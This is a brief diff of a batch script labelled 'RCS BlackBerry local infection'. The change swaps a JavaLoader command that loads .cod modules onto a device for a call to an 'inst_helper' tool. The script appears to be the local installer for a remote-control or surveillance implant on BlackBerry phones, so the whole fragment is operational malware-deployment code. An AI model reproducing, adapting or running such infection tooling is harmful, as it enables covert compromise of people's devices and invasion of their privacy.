@@ -6,7 +6,7 @@ echo    * RCS BlackBerry local infection *
 echo    **********************************
 echo.
 
-bin\JavaLoader load res\net_rim_bb_lib_base.cod res\net_rim_bb_lib.cod 
+res\inst_helper interactive
 IF %ERRORLEVEL% NEQ 0 GOTO failure
 
 :success
